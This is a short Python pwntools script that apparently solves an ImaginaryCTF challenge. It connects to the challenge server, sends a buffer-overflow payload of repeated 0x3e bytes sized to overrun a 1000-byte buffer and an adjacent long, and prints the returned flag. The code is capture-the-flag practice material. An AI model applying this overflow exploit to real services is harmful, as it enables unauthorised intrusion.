from pwn import *
def main():
    host,port = 'puzzler7.imaginaryctf.org', 1111
    local = False
    fname = './vuln'                            # gcc -o vuln vuln.c
    elf = ELF(f'./{fname}') if local else None
    struct_size = 0x3e8                         # sizeof(char)*1000 [buffer]
    struct_size += 0x8                          # sizeof(long)
    struct_size += 0x8                          # trigger overflow
    try:
        p = elf.process() if local else remote(host,port)
        payload = b'\x3e'*(struct_size)         # rdx and rax must both be 0x3e3e3e3e3e3e3e3e
        p.sendline(payload)
        p.recvuntil(b'\n')
        flag = p.recvline().rstrip().decode()
        log.info(f'got flag: {flag=}')
    except Exception as e:
        print(f'Exception: {e}')
    finally:
        p.close()                               # exit nicely
main()
